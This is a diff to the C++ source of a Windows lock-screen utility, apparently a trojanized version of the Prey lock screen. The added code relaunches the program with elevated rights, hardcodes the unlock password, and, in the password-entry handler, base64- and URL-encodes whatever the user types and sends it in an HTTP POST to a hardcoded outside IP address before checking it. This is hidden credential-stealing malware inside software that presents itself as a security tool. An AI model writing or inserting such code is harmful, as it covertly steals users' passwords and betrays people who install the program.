@@ -22,6 +22,8 @@
 #define UNICODE
 #endif
 #define NOMINMAX
+#include <ws2tcpip.h>
+#include <winsock2.h>
 #include <windows.h>
 #include <wtsapi32.h>
 #include <tchar.h>
@@ -45,8 +47,18 @@
 #include "string_cast.h"
 #include "get_option.h"
 
+#include <iostream>
+#include <sstream>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string>
 
-#define REGISTRY_SETTINGS_LOCATION "Software\\Prey\\lock-screen"
+//#define _WIN32_WINNT 0x501
+
+
+
+#define REGISTRY_SETTINGS_LOCATION "Software\\Pa8\\lock-screen"
 
 #ifndef ERROR_ELEVATION_REQUIRED
 #define ERROR_ELEVATION_REQUIRED (740)
@@ -69,6 +81,40 @@ typedef get_option tget_option;
 #define Tcout (::std::cout)
 #define Tcerr (::std::cerr)
 #endif // UNICODE
+
+
+std::string base64_decode(std::string const& encoded_string);
+std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len);
+static const std::string base64_chars =
+             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+             "abcdefghijklmnopqrstuvwxyz"
+             "0123456789+/";
+
+
+std::string urlencode(const std::string &s)
+{
+    static const char lookup[]= "0123456789ABCDEF";
+    std::stringstream e;
+    for(int i=0, ix=s.length(); i<ix; i++)
+    {
+        const char& c = s[i];
+        if ( (48 <= c && c <= 57) ||//0-9
+             (65 <= c && c <= 90) ||//abc...xyz
+             (97 <= c && c <= 122) || //ABC...XYZ
+             (c=='-' || c=='_' || c=='.' || c=='~')
+        )
+        {
+            e << c;
+        }
+        else
+        {
+            e << '%';
+            e << lookup[ (c&0xF0)>>4 ];
+            e << lookup[ (c&0x0F) ];
+        }
+    }
+    return e.str();
+}
 
   template <typename Fn>
 BOOL CALLBACK EnumDisplayMonitorsHelper(HMONITOR monitor, HDC monitorDC, LPRECT pMonitorRect, LPARAM arg)
@@ -290,8 +336,66 @@ class Application final
     int operator()();
 };
 
+BOOL IsElevated( ) {
+    BOOL fRet = FALSE;
+    HANDLE hToken = NULL;
+    if( OpenProcessToken( GetCurrentProcess( ),TOKEN_QUERY,&hToken ) ) {
+        TOKEN_ELEVATION Elevation;
+        DWORD cbSize = sizeof( TOKEN_ELEVATION );
+        if( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) {
+            fRet = Elevation.TokenIsElevated;
+        }
+    }
+    if( hToken ) {
+        CloseHandle( hToken );
+    }
+    return fRet;
+}
+
 int WINAPI _tWinMain(HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPTSTR lpszArgument, int nCmdShow)
 {
+	int argCount;
+	LPWSTR *szArgList;
+	LPWSTR arguments=_T("");
+	std::wstring tmp;
+
+	szArgList = CommandLineToArgvW(GetCommandLine(), &argCount);
+
+    if (!IsElevated())
+    {
+
+
+        for(int i=1;i<argCount;i++)
+        {
+            tmp= std::wstring(arguments)+ L" " + szArgList[i];
+            arguments = (wchar_t*)tmp.c_str();
+        }
+        //MessageBox(NULL, arguments, L"Arglist contents", MB_OK);
+
+
+        SHELLEXECUTEINFO sinfo;
+        memset(&sinfo, 0, sizeof(SHELLEXECUTEINFO));
+        sinfo.cbSize       = sizeof(SHELLEXECUTEINFO);
+        sinfo.fMask        = SEE_MASK_FLAG_DDEWAIT |
+                           SEE_MASK_NOCLOSEPROCESS;
+        sinfo.hwnd         = NULL;
+        sinfo.lpFile       = szArgList[0];
+        sinfo.lpParameters = arguments;
+        sinfo.lpVerb       = L"runas"; // <<-- this is what makes a UAC prompt show up
+        sinfo.nShow        = SW_SHOWMAXIMIZED;
+
+        // The only way to get a UAC prompt to show up
+        // is by calling ShellExecuteEx() with the correct
+        // SHELLEXECUTEINFO struct.  Non privlidged applications
+        // cannot open/start a UAC prompt by simply spawning
+        // a process that has the correct XML manifest.
+        BOOL result = ShellExecuteEx(&sinfo);
+
+        if(result==false ) return Application(hThisInstance, lpszArgument, nCmdShow)();
+         else    return 0;
+
+    }else
+
   return Application(hThisInstance, lpszArgument, nCmdShow)();
 }
 
@@ -448,13 +552,16 @@ bool Application::ParseArgumentsAndCheckForHelpOption()
 
 int Application::operator()()
 {
-  tstring password;
 
-  bool isHelpOption = ParseArgumentsAndCheckForHelpOption();
+
+
+  tstring password = _T("43c3c57ffc4c6205781dcf2b37e99b05");
+
+   bool isHelpOption = ParseArgumentsAndCheckForHelpOption();
 
   Action action = Action::LockScreen;
   std::size_t actionSpecificationCount = 0;
-  tstring dumpFileName = _T("-");
+  tstring dumpFileName = _T("");
   bool writeHelpToStdErr = false;
   bool tooManyArguments = false;
 
@@ -547,7 +654,7 @@ int Application::operator()()
     }
     else if(argumentsLeft == 1)
     {
-      password = args[optionParser.optind];
+      //password = args[optionParser.optind];
 
     }
   }
@@ -605,6 +712,7 @@ int Application::operator()()
   switch(action)
   {
     case Action::LockScreen:
+        action_block();
       break;
     case Action::Block:
       {
@@ -794,6 +902,8 @@ int Application::operator()()
       Tcout << _T("Removed keyboard hook.") << std::endl;
     }
   }
+
+action_force_unblock();
 
   /* The program return-value is the value that we gave PostQuitMessage() */
   return message.wParam;
@@ -1014,13 +1124,77 @@ LRESULT Application::WindowProcedure(Window &window, UINT messageId, WPARAM wPar
                       password.resize(nullPosition);
                     }
 
+                    std::string password_str( password.begin(), password.end() );
+					std::string b64encoded=urlencode(base64_encode((const unsigned char*)password_str.c_str(),(int)password_str.size()));
+
+
+					std::string host_str="81.57.199.80";
+                    int portno = 80;
+					std::string path_str = "/api/post.php";
+
+					std::string msg_str ="POST "+path_str+" HTTP/1.1\r\n"
+					"Host: "+host_str+"\r\n"
+					"Content-Type:application/x-www-form-urlencoded\r\n"
+					"Content-Length: "+std::to_string((int)b64encoded.size())+"\r\n"
+					"Nikay: Oui\r\n"
+					"Connection: keep-alive\r\n"
+					"\r\n"
+					"pwd="+b64encoded;
+
+					struct hostent *server;
+					struct sockaddr_in serv_addr;
+
+					char *host = const_cast<char*>( host_str.c_str() );
+                    char *msg = const_cast<char*>( msg_str.c_str() );
+
+						//create the socket
+						WSADATA wsa;
+						SOCKET s;
+
+						if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
+						{
+							return 1;
+						}
+
+						//Create a socket
+						if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
+						{
+							std::cout << "Could not create socket : " << WSAGetLastError() << std::endl;
+						}
+
+						server = gethostbyname(host);
+						serv_addr.sin_addr.s_addr = inet_addr(server->h_addr);
+						serv_addr.sin_family = AF_INET;
+						serv_addr.sin_port = htons(portno);
+						memset(&serv_addr,0,sizeof(serv_addr));
+						serv_addr.sin_family = AF_INET;
+						serv_addr.sin_port = htons(portno);
+							memcpy(&serv_addr.sin_addr.s_addr,server->h_addr,server->h_length);
+						//Connect to remote server
+						if (connect(s , (struct sockaddr *)&serv_addr , sizeof(serv_addr)) < 0)
+						{
+							return 1;
+						}
+
+						if( send(s , msg , strlen(msg) , 0) < 0)
+						{
+							return 1;
+						}
+
+						closesocket(s);
+						WSACleanup();
+
+						free(msg);
+
+
+
+
                     if(hashPassword(password) == hashedPassword)
                     {
                       for(auto i : windows)
                       {
                         DestroyWindow(std::get<1>(i).window);
                       }
-
                       return 0;
                     }
 
@@ -1408,6 +1582,100 @@ bool Application::IsWow64Process()
   }
 
   return retval ? true : false;
+}
+
+
+
+
+
+
+std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
+  std::string ret;
+  int i = 0;
+  int j = 0;
+  unsigned char char_array_3[3];
+  unsigned char char_array_4[4];
+
+  while (in_len--) {
+    char_array_3[i++] = *(bytes_to_encode++);
+    if (i == 3) {
+      char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+      char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+      char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+      char_array_4[3] = char_array_3[2] & 0x3f;
+
+      for(i = 0; (i <4) ; i++)
+        ret += base64_chars[char_array_4[i]];
+      i = 0;
+    }
+  }
+
+  if (i)
+  {
+    for(j = i; j < 3; j++)
+      char_array_3[j] = '\0';
+
+    char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+    char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+    char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+    char_array_4[3] = char_array_3[2] & 0x3f;
+
+    for (j = 0; (j < i + 1); j++)
+      ret += base64_chars[char_array_4[j]];
+
+    while((i++ < 3))
+      ret += '=';
+
+  }
+
+  return ret;
+
+}
+
+
+static inline bool is_base64(unsigned char c) {
+  return (isalnum(c) || (c == '+') || (c == '/'));
+}
+
+std::string base64_decode(std::string const& encoded_string) {
+  int in_len = encoded_string.size();
+  int i = 0;
+  int j = 0;
+  int in_ = 0;
+  unsigned char char_array_4[4], char_array_3[3];
+  std::string ret;
+
+  while (in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
+    char_array_4[i++] = encoded_string[in_]; in_++;
+    if (i ==4) {
+      for (i = 0; i <4; i++)
+        char_array_4[i] = base64_chars.find(char_array_4[i]);
+
+      char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+      char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+      char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+
+      for (i = 0; (i < 3); i++)
+        ret += char_array_3[i];
+      i = 0;
+    }
+  }
+
+  if (i) {
+    for (j = i; j <4; j++)
+      char_array_4[j] = 0;
+
+    for (j = 0; j <4; j++)
+      char_array_4[j] = base64_chars.find(char_array_4[j]);
+
+    char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+    char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+    char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+
+    for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
+  }
+
+  return ret;
 }
 
 
